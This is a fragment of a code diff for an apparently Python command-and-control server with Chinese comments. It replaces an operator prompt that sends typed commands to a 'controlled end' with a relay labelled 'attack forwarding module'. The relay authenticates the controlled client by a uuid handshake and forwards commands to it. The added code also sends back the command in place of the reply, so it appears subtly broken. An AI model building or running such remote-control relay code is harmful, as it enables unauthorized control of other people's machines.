@@ -56,37 +56,33 @@ while True:
 		cli.sendall(data.encode())
 		user = cli.recv(2048).decode()
 
-		sock2 = socket.socket()
-		#绑定主机和端口
-		sock2.bind((host, port))
-		#开始监听
-		sock2.listen(5)
-		#对话循环
+
 		while True:
-			cli, addr = sock2.accept()
-			mod = cli.recv(2048).decode()
 
+			sock2 = socket.socket()
+			#绑定主机和端口
+			sock2.bind((host, port))
+			#开始监听
+			sock2.listen(5)
+			#对话循环
+			while True:
+				cli2, addr = sock2.accept()
+				mod = cli2.recv(2048).decode()
+				cli2.sendall("my".encode())
+				uuid = cli2.recv(2048).decode()
 
+				if uuid != user:
+					cli2.sendall("stop".encode())
+				else:
+					cli2.sendall("start".encode())
+					break
+			break
 
-
-
-
-
-
-
-
-
-
-	cli.sendall("my".encode())
-	print("被控端接入！")
-	print(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))
-
-	uuid = cli.recv(2048).decode()
-	cli.sendall("start".encode())
-
-	while True:
-		cmd = input(">>>")
-		cli.sendall(cmd.encode())
-		z = cli.recv(10240).decode()
-		z = z.split("thisisafengefu")
-		print(z)
+		cli.sendall("online".encode())
+		time.sleep(1)
+		while True:
+			#攻击转发模块
+			cmd = cli.recv(2048).decode()
+			cli2.sendall(cmd.encode())
+			re = cli2.recv(2048).decode()
+			cli.sendall(cmd.encode())
